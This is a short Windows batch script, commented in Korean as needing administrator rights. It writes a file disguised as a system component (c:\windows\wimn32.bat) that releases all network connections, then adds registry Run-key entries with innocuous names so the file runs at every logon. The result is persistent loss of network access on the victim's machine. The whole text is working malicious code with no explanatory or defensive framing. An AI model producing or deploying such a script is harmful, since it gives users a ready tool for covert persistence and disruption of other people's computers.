:: 관리자 권한 필요
@echo off
echo @echo off >> c:\windows\wimn32.bat
echo break off >> c:\windows\wimn32.bat
echo ipconfig/release_all>>c:\windows\wimn32.bat
echo end >> c:\windows\wimn32.bat

reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v WindowsAPI /t reg_sz /d c:\windows\wimn32.bat /f
reg add hkey_current_user\software\microsoft\windows\currentversion\run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f

PAUSE
